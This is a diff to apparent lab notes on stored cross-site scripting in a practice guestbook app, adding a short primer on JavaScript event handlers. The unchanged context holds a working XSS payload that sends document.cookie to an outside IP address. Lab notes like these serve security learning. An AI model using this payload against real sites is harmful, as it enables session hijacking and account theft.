@@ -1,3 +1,23 @@
+# common JS
+## onload event
+```html
+<body onload='alert("Welcome to my website")'>
+```
+## on mouse over
+```html
+<a onmouseover='alert("50% discount")'>surprise</a>
+```
+## other event handlers
+| Event Handler | Description |
+| --- | --- |
+| onclick: | Use this to invoke JavaScript upon clicking (a link, or form boxes) |
+| onload: | Use this to invoke JavaScript after the page or an image has finished loading |
+| onmouseover | Use this to invoke JavaScript if the mouse passes by some link |
+| onmouseout | Use this to invoke JavaScript if the mouse goes pass some link |
+| onunload | Use this to invoke JavaScript right after someone leaves this page. |
+
+---
+
 # XSS: security: low
 ```php
 <?php
@@ -41,7 +61,7 @@ Upgrade-Insecure-Requests: 1
 
 txtName=test2&mtxMessage=test2&btnSign=Sign+Guestbook
 ```
-## XSS Request: payload (url-encoded) in the Message parameter:
+## XSS Request: payload (url-encoded) in the txtMessage parameter (the txtName parameter was also vulnerable)
 ```html
 <script>new Image().src="http://20.20.20.129/cool.jpg?output="+document.cookie;</script>
 ```
